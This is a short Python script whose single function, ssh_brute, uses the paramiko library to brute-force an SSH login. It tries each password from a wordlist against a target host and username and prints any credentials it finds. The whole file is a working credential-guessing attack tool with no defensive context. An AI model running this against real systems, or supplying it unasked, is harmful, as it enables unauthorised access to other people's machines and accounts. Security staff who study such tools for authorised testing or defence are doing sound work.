#/usr/bin/python3
import paramiko

def ssh_brute(target, username, wordlist):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy)

    with open(wordlist, "r") as passwords:
        for password in passwords:
            password = password.strip()

            try:
                ssh.connect(target, username=username, password=password)
                print(f'[+] Credintials found! Username: {username} Password: {password}')
                return True
            except paramiko.AuthenticationException:
                print(f"[-] Failed password: {password}")
            except paramiko.SSHException:
                print(f"[-] Connection error with {target}")
                return False
            except Exception as e:
                print(f"[-] Unknown error")
                return False
        return False



            